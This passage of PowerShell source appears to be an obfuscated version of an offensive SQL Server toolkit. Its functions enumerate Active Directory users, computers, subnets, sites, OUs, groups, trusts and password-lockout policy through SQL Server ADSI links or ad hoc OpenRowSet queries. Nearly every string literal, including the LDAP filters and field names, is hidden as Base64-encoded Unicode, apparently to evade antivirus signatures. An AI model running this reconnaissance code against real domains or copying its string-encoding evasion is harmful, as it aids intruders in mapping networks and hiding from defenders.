            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAZAA=')))                     {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhAHUAcwBlAHIAQQBjAGMAbwB1AG4AdABDAG8AbgB0AHIAbwBsADoAMQAuADIALgA4ADQAMAAuADEAMQAzADUANQA2AC4AMQAuADQALgA4ADAAMwA6AD0AMgApAA==')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA==')))                    {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA=')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAawBlAGQA')))                      {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAEEATQBBAGMAYwBvAHUAbgB0AFQAeQBwAGUAPQA4ADAANQAzADAANgAzADYAOAApACgAbABvAGMAawBvAHUAdABUAGkAbQBlAD4AMAApAA==')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AE4AZQB2AGUAcgBFAHgAcABpAHIAZQBzAA==')))              {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADYANQA1ADMANgApAA==')))} 
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AE4AbwB0AFIAZQBxAHUAaQByAGUAZAA=')))               {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADMAMgApAA==')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB3AFMAdABvAHIAZQBkAFIAZQB2AEUAbgBjAA==')))              {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMgA4ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAQQB1AHQAaABOAG8AdABSAGUAcQB1AGkAcgBlAGQA')))          {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAMQA5ADQAMwAwADQAKQA=')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBtAGEAcgB0AEMAYQByAGQAUgBlAHEAdQBpAHIAZQBkAA==')))           {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIANgAyADEANAA0ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABGAG8AcgBEAGUAbABlAGcAYQB0AGkAbwBuAA==')))        {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaABGAG8AcgBEAGUAbABlAGcAYQB0AGkAbwBuAA==')))  {$UserStateFilter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEANgA3ADcANwAyADEANgApAA==')))}
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgBhAG0AZQAsAGEAZABtAGkAbgBjAG8AdQBuAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABhAGQAcwBwAGEAdABoAA=='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Person)(objectClass=user)$PwLastSetFilter(SamAccountName=$FilterUser)$UserStateFilter)" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgBhAG0AZQAsAGEAZABtAGkAbgBjAG8AdQBuAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABhAGQAcwBwAGEAdABoAA==')))          
        }
    }
    End
    {                                       
    }
}
Function  Get-SQLDomainSubnet
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | select DomainName -ExpandProperty DomainName
        $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc | select distinguishedname -ExpandProperty distinguishedname
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAHUAYgBuAGUAdAApAA=='))) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHMAaQB0AGUAbwBiAGoAZQBjAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABsAG8AYwBhAHQAaQBvAG4A'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAHUAYgBuAGUAdAApAA=='))) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHMAaQB0AGUAbwBiAGoAZQBjAHQALAB3AGgAZQBuAGMAcgBlAGEAdABlAGQALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABsAG8AYwBhAHQAaQBvAG4A')))          
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainSite
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        $Domain = Get-SQLServerInfo -SuppressVerbose -Instance $Instance -Username $Username -Password $Password | select DomainName -ExpandProperty DomainName
        $DomainDistinguishedName = Get-SQLDomainObject -SuppressVerbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath "$Domain" -LdapFilter "(name=$Domain)" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -UseAdHoc | select distinguishedname -ExpandProperty distinguishedname
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAGkAdABlACkA'))) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBzAGkAdABlACkA'))) -LdapPath "$Domain/CN=Sites,CN=Configuration,$DomainDistinguishedName" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA=')))          
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainComputer
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain computer to filter for.')]
        [string]$FilterComputer,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterComputer)){
            $FilterComputer = '*'
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AUwBlAHIAdgBpAGMAZQBQAGEAYwBrACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$FilterComputer))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlACwAbwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0ALABvAHAAZQByAGEAdABpAG4AZwBzAHkAcwB0AGUAbQB2AGUAcgBzAGkAbwBuACwAbwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0AUwBlAHIAdgBpAGMAZQBQAGEAYwBrACwAdwBoAGUAbgBjAHIAZQBhAHQAZQBkACwAdwBoAGUAbgBjAGgAYQBuAGcAZQBkACwAYQBkAHMAcABhAHQAaAA=')))            
        }
    }
    End
    {
    }
}
Function  Get-SQLDomainOu
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBvAHIAZwBhAG4AaQB6AGEAdABpAG8AbgBhAGwAVQBuAGkAdAApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAGEAZABzAHAAYQB0AGgALABpAG4AcwB0AGEAbgBjAGUAdAB5AHAAZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA='))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGEAdABlAGcAbwByAHkAPQBvAHIAZwBhAG4AaQB6AGEAdABpAG8AbgBhAGwAVQBuAGkAdAApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQAsAGEAZABzAHAAYQB0AGgALABpAG4AcwB0AGEAbgBjAGUAdAB5AHAAZQAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAA=')))
        }
    }
    End
    {                                           
    }
}
Function  Get-SQLDomainAccountPolicy
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TableAccountPolicy = New-Object System.Data.DataTable 
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAA=')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdAB0AGgAcgBlAHMAaABvAGwAZAA=')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdABkAHUAcgBhAHQAaQBvAG4A')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBvAHUAdABvAGIAcwBlAHIAdgBhAHQAaQBvAG4AdwBpAG4AZABvAHcA')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAG4AcAB3AGQAbABlAG4AZwB0AGgA')))) | Out-Null 
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBpAG4AcAB3AGQAYQBnAGUA')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAcAByAG8AcABlAHIAdABpAGUAcwA=')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA==')))) | Out-Null
        $TableAccountPolicy.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGwAaQBuAGsA')))) | Out-Null
    }
    Process
    {
        if($UseAdHoc){
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgBEAE4AUwApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAAsAGwAbwBjAGsAbwB1AHQAdABoAHIAZQBzAGgAbwBsAGQALABsAG8AYwBrAG8AdQB0AGQAdQByAGEAdABpAG8AbgAsAGwAbwBjAGsAbwB1AHQAbwBiAHMAZQByAHYAYQB0AGkAbwBuAHcAaQBuAGQAbwB3ACwAbQBpAG4AcAB3AGQAbABlAG4AZwB0AGgALABtAGkAbgBwAHcAZABhAGcAZQAsAHAAdwBkAHAAcgBvAHAAZQByAHQAaQBlAHMALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABnAHAAbABpAG4AawA='))) -UseAdHoc            
        }else{
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG8AbQBhAGkAbgBEAE4AUwApAA=='))) -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAaABpAHMAdABvAHIAeQBsAGUAbgBnAHQAaAAsAGwAbwBjAGsAbwB1AHQAdABoAHIAZQBzAGgAbwBsAGQALABsAG8AYwBrAG8AdQB0AGQAdQByAGEAdABpAG8AbgAsAGwAbwBjAGsAbwB1AHQAbwBiAHMAZQByAHYAYQB0AGkAbwBuAHcAaQBuAGQAbwB3ACwAbQBpAG4AcAB3AGQAbABlAG4AZwB0AGgALABtAGkAbgBwAHcAZABhAGcAZQAsAHAAdwBkAHAAcgBvAHAAZQByAHQAaQBlAHMALAB3AGgAZQBuAGMAaABhAG4AZwBlAGQALABnAHAAbABpAG4AawA=')))
        }
        $Results | % {
            $TableAccountPolicy.Rows.Add(
            $_.pwdHistoryLength,
            $_.lockoutThreshold,
            [string]([string]$_.lockoutDuration -replace '-','') / (60 * 10000000),
            [string]([string]$_.lockOutObservationWindow -replace '-','') / (60 * 10000000),
            $_.minPwdLength,
            [string][Math]::Floor([decimal](((([string]$_.minPwdAge -replace '-','') / (60 * 10000000)/60))/24)),
            [string]$_.pwdProperties,
            [string]$_.whenChanged,
            [string]$_.gPLink 
            ) | Out-Null
        }
        $TableAccountPolicy
    }
    End
    {                     
    }
}
Function  Get-SQLDomainGroup
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        if((-not $FilterGroup)){
            $FilterGroup = '*'
        }
    }
    Process
    {
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAYQBkAG0AaQBuAEMAbwB1AG4AdAAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGEAZABzAHAAYQB0AGgA'))) -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAYQBkAG0AaQBuAEMAbwB1AG4AdAAsAHcAaABlAG4AYwByAGUAYQB0AGUAZAAsAHcAaABlAG4AYwBoAGEAbgBnAGUAZAAsAGEAZABzAHAAYQB0AGgA')))            
        }
    }
    End
    {               
    }
}
Function  Get-SQLDomainTrust
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
